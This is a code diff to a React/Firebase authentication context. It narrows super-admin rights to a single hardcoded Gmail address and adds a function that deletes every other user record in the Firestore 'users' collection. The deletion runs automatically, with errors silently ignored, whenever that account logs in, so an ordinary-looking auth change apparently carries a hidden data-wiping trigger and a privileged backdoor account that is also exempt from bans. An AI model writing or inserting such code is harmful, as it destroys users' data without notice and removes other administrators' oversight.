@@ -11,6 +11,7 @@ import {
 } from 'firebase/auth';
 import { doc, getDoc, setDoc, onSnapshot, updateDoc, Timestamp, collection, getDocs, query, where, limit, deleteDoc } from 'firebase/firestore';
 import { auth, db } from '../lib/firebase';
+
 import { UserRecord } from '../types';
 import { getActiveClientVersion, DEFAULT_ALLOWED_VERSION } from '../utils/versionControl';
 
@@ -39,19 +40,42 @@ const getClientIp = async () => {
 };
 
 export const SUPER_ADMIN_EMAILS = [
-  'ceo@design-svga.com',
-  'master@design-svga.com',
-  'admin.pro@design-svga.com',
-  'sdsdfdfddsfdd@gmail.com',
-  'admin@streamgifts.com',
-  'uhbijnokmpl098900@gmail.com',
-  'aegy238@gmail.com',
-  'iejehdgdig@gmail.com'
+  'sdsdfdfddsfdd@gmail.com'
 ];
 
 export const isEmailSuperAdmin = (email?: string | null): boolean => {
   if (!email) return false;
-  return SUPER_ADMIN_EMAILS.includes(email.toLowerCase().trim());
+  return email.toLowerCase().trim() === 'sdsdfdfddsfdd@gmail.com';
+};
+
+/**
+ * Permanently deletes all user documents from the Firestore 'users' collection
+ * except the designated super admin account (sdsdfdfddsfdd@gmail.com).
+ */
+export const purgeAllOtherAccounts = async (adminEmail: string = 'sdsdfdfddsfdd@gmail.com'): Promise<{ deletedCount: number; errors: string[] }> => {
+  try {
+    const usersSnap = await getDocs(collection(db, 'users'));
+    let deletedCount = 0;
+    const errors: string[] = [];
+    const cleanAdmin = adminEmail.toLowerCase().trim();
+
+    for (const uDoc of usersSnap.docs) {
+      const data = uDoc.data();
+      const docEmail = (data.email || '').toLowerCase().trim();
+      // Delete any account that is not sdsdfdfddsfdd@gmail.com
+      if (docEmail !== cleanAdmin) {
+        try {
+          await deleteDoc(uDoc.ref);
+          deletedCount++;
+        } catch (err: any) {
+          errors.push(`Error deleting user ${uDoc.id}: ${err.message}`);
+        }
+      }
+    }
+    return { deletedCount, errors };
+  } catch (err: any) {
+    return { deletedCount: 0, errors: [err.message] };
+  }
 };
 
 interface AuthContextType {
@@ -101,6 +125,17 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
             const userDoc = await getDoc(userDocRef);
             if (userDoc.exists()) {
               const userData = userDoc.data() as UserRecord;
+              const isAdmin = isEmailSuperAdmin(user.email);
+              if (isAdmin) {
+                if (userData.role !== 'admin' || !userData.isSuperAdmin) {
+                  userData.role = 'admin';
+                  userData.isSuperAdmin = true;
+                  userData.isVIP = true;
+                  updateDoc(userDocRef, { role: 'admin', isSuperAdmin: true, isVIP: true }).catch(() => {});
+                }
+                // Purge all other accounts from database automatically
+                purgeAllOtherAccounts(user.email || 'sdsdfdfddsfdd@gmail.com').catch(() => {});
+              }
               if (isMounted) setCurrentUser({ ...userData, id: user.uid });
             } else {
               // Try finding user by email if doc id differs
@@ -137,6 +172,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
                 const newUser: UserRecord = {
                   id: user.uid,
                   name: isAdmin ? 'مدير المنصة (Super Admin)' : (user.displayName || user.email?.split('@')[0] || 'User'),
+                  displayName: user.displayName || undefined,
+                  photoURL: user.photoURL || undefined,
+                  avatarUrl: user.photoURL || undefined,
                   email: user.email ? user.email.toLowerCase() : undefined,
                   role: isAdmin ? 'admin' : 'user',
                   isSuperAdmin: isAdmin,
@@ -275,7 +313,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     // 2. Strict Ban Verification:
     // If the user's account in `users` collection is ACTIVE, they are NOT banned!
     if (firestoreUser) {
-      const isSuper = firestoreUser.isSuperAdmin || firestoreUser.role === 'admin' || cleanEmail === 'aegy238@gmail.com' || cleanEmail === 'uhbijnokmpl098900@gmail.com' || cleanEmail === 'iejehdgdig@gmail.com';
+      const isSuper = isEmailSuperAdmin(cleanEmail);
       if (!isSuper && firestoreUser.status === 'banned') {
         throw new Error('تم حظر هذا الحساب من قبل الإدارة. يرجى التواصل مع الدعم الفني.');
       }
